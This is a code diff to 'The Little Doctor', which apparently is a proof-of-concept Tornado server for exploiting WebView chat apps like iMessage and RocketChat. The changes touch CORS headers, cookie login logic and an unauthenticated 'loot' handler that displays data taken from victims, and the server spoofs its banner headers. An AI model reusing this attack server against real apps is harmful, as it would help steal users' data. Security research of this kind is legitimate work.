@@ -1,6 +1,10 @@
 """
 The Little Doctor
 
+This is a very simple PoC server for exploiting a few WebView apps, like
+iMessage (patched), and RocketChat (also patched), but much of the code
+can be reused to exploit other apps too, enjoy.
+
 @author: mandatory, moloch, shubs
 """
 # pylint: disable=C0103,C0111,R0201,W0223
@@ -94,8 +98,9 @@ class BaseRequestHandler(RequestHandler):
         self.set_header("Server", "Microsoft-IIS/7.5")
         self.set_header("X-Powered-By", "PHP/5.2.17")
         self.set_header("X-AspNet-Version", "2.0.50727")
-        self.set_header("Access-Control-Allow-Origin", "*")
+        self.set_header("Access-Control-Allow-Origin", self.request.host)
         self.set_header("Access-Control-Allow-Credentials", "true")
+        self.set_header("Access-Control-Allow-Headers", "X-Filename")
         self.set_header("Access-Control-Expose-Headers", "X-Filename")
 
     def get_current_user(self):
@@ -113,7 +118,7 @@ class LoginHandler(BaseRequestHandler):
 
     def get(self):
         user = self.get_current_user()
-        if user is not None:
+        if user is None:
             user_id = os.urandom(16).encode('hex')
             self.set_secure_cookie(USER_ID, user_id)
         else:
@@ -149,12 +154,6 @@ class PlistParserHandler(BaseRequestHandler):
         self.write({"username": username})
 
 
-class LootHandler(BaseRequestHandler):
-
-    def get(self):
-        self.render("templates/loot.html")
-
-
 class DownloadHandler(BaseRequestHandler):
 
     def get(self):
@@ -171,6 +170,18 @@ class DownloadHandler(BaseRequestHandler):
                 self.set_status(404)
         else:
             self.set_status(404)
+
+
+class LootHandler(BaseRequestHandler):
+
+    """
+    This is totally unauthenticated to discourage people from actually using it,
+    if you can write you own authentication mechanism we assume you're smart enough
+    to write the rest of the code too, so it wouldn't really matter.
+    """
+
+    def get(self):
+        self.render("templates/loot.html")
 
 
 class FourOhFourHandler(BaseRequestHandler):
